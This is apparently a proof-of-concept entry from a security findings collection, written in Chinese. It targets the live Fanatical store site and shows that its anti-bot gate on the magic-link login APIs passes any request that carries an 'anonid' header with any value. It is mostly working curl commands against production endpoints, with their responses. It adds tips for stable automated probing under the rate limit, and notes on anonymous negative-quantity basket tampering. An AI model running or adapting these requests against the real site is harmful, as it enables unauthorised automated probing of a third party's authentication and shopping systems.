# Fanatical www/api 反爬/请求过滤门禁（HTTP 400 "Request blocked"）可被任意值 anonid 请求头绕过

- **code**: fanatical-api-request-blocked-gate-bypass-anonid-header
- **kind**: poc
- **category**: waf
- **component**: Fanatical 主站 www/api 应用层反自动化门禁（Heroku 应用 + Cloudflare Worker 前端，x-is-cf-worker: 1）
- **severity**: low
- **language**: markdown
- **source**: self
- **verified**: 1
- **verified_note**: 2026-11-11 本机 Windows + curl（UA=$ARTEX_UA）对 https://www.fanatical.com/api/auth/* 实测：① 无 anonid（连续 3 次）POST /api/auth/magic/cast → HTTP/2 400，content-type text/html，body 恰为 "Request blocked"（len=15）；② 仅新增请求头 anonid: 11111111-1111-4111-8111-111111111111（连续 3 次）→ HTTP/2 404，content-type application/json，body {"message":"Magic link not found"}，即已穿过门禁到达业务逻辑；③ 对照：只加 x-fan-fp / X-Fan-Client-Version / foo 等头 → 仍 400 "Request blocked"，而 anonid: hello（非 UUID）→ 404，证明门禁只认 header 名、不校验内容；④ 同一绕过作用于 /api/auth/magic/summon：无 anonid→400 blocked，有 anonid→202 {"type":"reCaptcha",...}。响应头 x-is-cf-worker: 1 显示拦截页与正常响应同经 CF Worker，判定为应用层反自动化门禁。finding_checks.verdict=verified。
- **path**: pocs/fanatical-api-request-blocked-gate-bypass-anonid-header/poc.md
- **tags**: fanatical,反爬,请求门禁,header-bypass,anonid,cloudflare-worker,api,ecommerce,bot-gate,waf-bypass,logic
- **created_at**: 2026-11-11T15:02:07.926Z
- **engine**: https://www.fanatical.com/api/auth/magic/cast ; https://www.fanatical.com/api/auth/magic/summon

## 描述

Fanatical 主站 www/api/* 上的应用层反自动化门禁：缺失特定请求头时返回 HTTP 400 + text/html body "Request blocked"。该门禁只检查 anonid 请求头的存在性、不校验其内容，任意值（甚至非 UUID 的 "hello"）即被放行，直达真实业务逻辑（返回 JSON 应用响应）。对 /api/auth/magic/cast、/api/auth/magic/summon 等认证相关接口生效，使本应被拦下的自动化探测/凭据强度验证请求可直接进入应用（仅剩服务端 429 限速约束）。

## 用法

```
前置：网络可直达 https://www.fanatical.com/api（本环境直连即可，静态与 /api 动态路径均未被 CF 挑战），无需账号/Cookie。判据 = 加任意值 anonid 头后返回 JSON 业务响应（而非 text/html 的 "Request blocked"）。

# 基线：无 anonid → 400 Request blocked（被门禁拦下）
curl -sk -A "$ARTEX_UA" -H 'Accept: application/json' -H 'Content-Type: application/json' \
  -X POST -d '{"spell":"abc"}' https://www.fanatical.com/api/auth/magic/cast

# 绕过：加任意值 anonid → 业务逻辑响应（404 JSON）
curl -sk -A "$ARTEX_UA" -H 'Accept: application/json' -H 'Content-Type: application/json' \
  -H 'anonid: 11111111-1111-4111-8111-111111111111' \
  -X POST -d '{"spell":"abc"}' https://www.fanatical.com/api/auth/magic/cast
# → HTTP/2 404  content-type: application/json  {"message":"Magic link not found"}

# 非 UUID 值同样放行（证明只认 header 名）
curl -sk -A "$ARTEX_UA" -H 'Content-Type: application/json' -H 'anonid: hello' \
  -X POST -d '{"spell":"abc"}' https://www.fanatical.com/api/auth/magic/cast
# → HTTP/2 404  {"message":"Magic link not found"}

# 同一绕过对 summon 生效
curl -sk -A "$ARTEX_UA" -H 'Content-Type: application/json' \
  -H 'anonid: 11111111-1111-4111-8111-111111111111' \
  -X POST -d '{"email":"nobody-test-xyz@example.com"}' https://www.fanatical.com/api/auth/magic/summon
# → HTTP/2 202  {"type":"reCaptcha","challengeId":"...","action":"LOGIN"}

要点：门禁只认 header 名的存在性，自动化探测时固定带一个 anonid 头即可稳定绕过；绕过只解决门禁不放宽速率（服务端仍 429）。失败常见原因：用了 GET 或缺 Content-Type: application/json；anonid 被中间代理剥除或误写成 query/body（必须作为请求头）；目标已修复（改为校验 anonid 内容）或换 CDN 边缘。
```

## 正文

```
# Fanatical /api 反爬/请求过滤门禁（"Request blocked"）可被任意值 anonid 头绕过

## 一句话
Fan 主站 `www/api/*` 上的应用层反自动化门禁（缺失某些请求头时返回 `HTTP 400` + `text/html` body `Request blocked`）**只检查 `anonid` 请求头的存在性、不校验其内容**：任意请求带上 `anonid: <任意值>`（甚至非 UUID 的 `hello`）即被放行，直达真实业务逻辑（返回 JSON 应用响应而非拦截页）。该绕过对 `/api/auth/magic/cast`、`/api/auth/magic/summon` 等认证相关接口生效，使本应被门禁拦下的自动化探测/凭据强度验证请求可直接进入应用（仅剩服务端 429 速率限制约束）。

## 前置
- 网络可直达 `https://www.fanatical.com/api`（本环境直连即可，静态与 `/api` 动态路径均未被 CF 挑战）。
- 无需任何账号 / Cookie。

## 判据（对照实验）
- **无 anonid** → `HTTP 400`，`content-type: text/html`，body 恰为 `Request blocked`（len=15）→ 被门禁拦下。
- **加 `anonid: <任意值>`** → 返回真实应用响应（`content-type: application/json`，如 404 `{"message":"Magic link not found"}`）→ 已穿过门禁到达业务层。
- **门禁只认 header 名**：`anonid: hello`（非 UUID）同样放行；而只加 `x-fan-fp` / `X-Fan-Client-Version` / `foo` 等其他头 → 仍 400 `Request blocked`。
- 响应头含 `x-is-cf-worker: 1`：**拦截页与正常响应同经 Cloudflare Worker**，说明 `Request blocked` 是应用层反自动化门禁，而非 CF 边缘 WAF。

## 复现命令
```bash
# 基线：无 anonid → 400 Request blocked
curl -sk -A "$ARTEX_UA" -H 'Accept: application/json' -H 'Content-Type: application/json' \
  -X POST -d '{"spell":"abc"}' https://www.fanatical.com/api/auth/magic/cast
# → HTTP/2 400  content-type: text/html  len=15  body: Request blocked

# 绕过：加任意值 anonid → 业务逻辑响应（404 JSON）
curl -sk -A "$ARTEX_UA" -H 'Accept: application/json' -H 'Content-Type: application/json' \
  -H 'anonid: 11111111-1111-4111-8111-111111111111' \
  -X POST -d '{"spell":"abc"}' https://www.fanatical.com/api/auth/magic/cast
# → HTTP/2 404  content-type: application/json  {"message":"Magic link not found"}

# 非 UUID 值同样放行（证明只认 header 名、不做内容校验）
curl -sk -A "$ARTEX_UA" -H 'Content-Type: application/json' -H 'anonid: hello' \
  -X POST -d '{"spell":"abc"}' https://www.fanatical.com/api/auth/magic/cast
# → HTTP/2 404  {"message":"Magic link not found"}

# 阴性对照：只加其他头仍被拦
curl -sk -A "$ARTEX_UA" -H 'Content-Type: application/json' -H 'foo: bar' \
  -X POST -d '{"spell":"abc"}' https://www.fanatical.com/api/auth/magic/cast
# → HTTP/2 400  Request blocked

# 同一门禁绕过对 summon 生效 → 202 reCaptcha challenge
curl -sk -A "$ARTEX_UA" -H 'Content-Type: application/json' \
  -H 'anonid: 11111111-1111-4111-8111-111111111111' \
  -X POST -d '{"email":"nobody-test-xyz@example.com"}' https://www.fanatical.com/api/auth/magic/summon
# → HTTP/2 202  {"type":"reCaptcha","challengeId":"...","action":"LOGIN"}
```

## 判定要点
- **关键区分**：加上任意值 anonid 后返回 JSON 业务响应（非 `text/html` 的 `Request blocked`）；对照组（其他头）仍 400。
- 该门禁本质 = 仅检查 header **名**的存在性，属「胖客户端伪装门禁」；自动化探测时固定带一个 `anonid` 头即可稳定绕过。
- 绕过只解决**门禁**，不放宽**速率**：服务端仍有 429 限速，批量请求需单线程 + 间隔。

## 失败常见原因
- 使用 GET 或缺失 `Content-Type: application/json`：接口只接受 POST+JSON，否则可能落到别的分支 / 仍被拦。
- `anonid` 头被中间代理剥除，或误写成正文/query 参数（必须是请求头）。
- 目标已修复（改成校验 anonid 内容），或换域名 / 换 CDN 边缘，则不再放行。

## 附：同站相关观察（另一 finding 要素，本次未独立建条）
`POST /api/basket` 未鉴权、不校验数量下限：`{"productSlug":"...","quantity":-5}` + 任意 anonid 头 → `HTTP 200`，响应体含 `"quantity":-5`，随后同 anonid `GET /api/basket` 回读为 `[('<slug>', -5)]`，证明负数量已持久化；且该接口可匿名对任意 anonid 读写购物车。对照：`quantity=99999999`→400 E5 `not allowed any more copies`、`quantity=0`→强制为 1、非 PWYW 走 `/basket/pay-what-you-want`→400 E6。**注意**：下单接口强制认证，篡改价下单的真实影响在匿名态无法闭合，故此点仅作线索记录，未定级、未独立入库。

## 关联
- 同站自建接口 `/api/algolia/get-hits-by-slugs` 也走同一门禁，需带 anonid 头（见 kb 条目 `herkou-shop-api-algolia-get-hits-by-slugs-filter-dsl-injecti`）。

```
